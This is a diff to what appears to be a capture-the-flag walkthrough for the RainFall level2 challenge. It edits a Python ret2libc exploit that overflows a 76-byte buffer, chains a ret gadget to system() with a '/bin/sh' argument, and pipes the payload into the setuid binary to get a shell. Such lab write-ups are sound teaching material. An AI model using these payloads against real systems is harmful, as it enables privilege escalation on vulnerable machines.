@@ -12,12 +12,6 @@ Let's start by examining our environment and understanding what we're working wi
 
 ```bash
 level2@RainFall:~$ ls -la
-total 17
-dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
-dr-x--x--x  1 root   root    340 Sep 23  2015 ..
--rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
--rw-r--r--  1 level2 level2 3530 Sep  3  2015 .bashrc
--rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
 -rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
 ```
 
@@ -423,6 +417,7 @@ import struct
 system_addr = 0xb7e6b060    # system() function
 binsh_addr = 0xb7f8cc58     # "/bin/sh" string
 ret_addr = 0x0804854b       # ret instruction in main
+p_ret_addr = 0x0804853e     # ret instruction for cleanup
 
 # Payload construction
 payload = ""
@@ -430,7 +425,7 @@ payload += "A" * 76                               # Fill 76-byte buffer
 payload += "BBBB"                                 # Overwrite saved EBP
 payload += struct.pack("<I", ret_addr)            # Return to ret instruction
 payload += struct.pack("<I", system_addr)         # system() address
-payload += struct.pack("<I", ret_addr)            # Return address for system
+payload += struct.pack("<I", p_ret_addr)           # Return address for system
 payload += struct.pack("<I", binsh_addr)          # "/bin/sh" argument
 
 print("Payload length:", len(payload))
@@ -505,31 +500,9 @@ Stack Pointer Movement During ROP:
 
 ## 🚀 Execution and Flag Retrieval
 
-Now let's execute our exploit:
 
 ```bash
-level2@RainFall:~$ (python -c '
-import struct
-
-system_addr = 0xb7e6b060
-binsh_addr = 0xb7f8cc58
-ret_addr = 0x0804854b
-
-payload = "A" * 76
-payload += "BBBB"
-payload += struct.pack("<I", ret_addr)
-payload += struct.pack("<I", system_addr)
-payload += struct.pack("<I", ret_addr)
-payload += struct.pack("<I", binsh_addr)
-
-print payload
-'; cat) | ./level2
-```
-
-Single Line:
-
-```bash
-(python -c 'import struct; system_addr=0xb7e6b060; binsh_addr=0xb7f8cc58; ret_addr=0x0804854b; payload="A"*80; payload+=struct.pack("<I",ret_addr); payload+=struct.pack("<I",system_addr); payload+=struct.pack("<I",system_addr); payload+=struct.pack("<I",binsh_addr); print(payload)' ; cat) | ./level2
+(python -c 'import struct; system_addr=0xb7e6b060; binsh_addr=0xb7f8cc58; ret_addr=0x0804854b; ret_addr_a=0x0804853e; payload="A"*80; payload+=struct.pack("<I",ret_addr); payload+=struct.pack("<I",system_addr); payload+=struct.pack("<I",ret_addr_a); payload+=struct.pack("<I",binsh_addr); print(payload)' ; cat) | ./level2
 
 ```
 
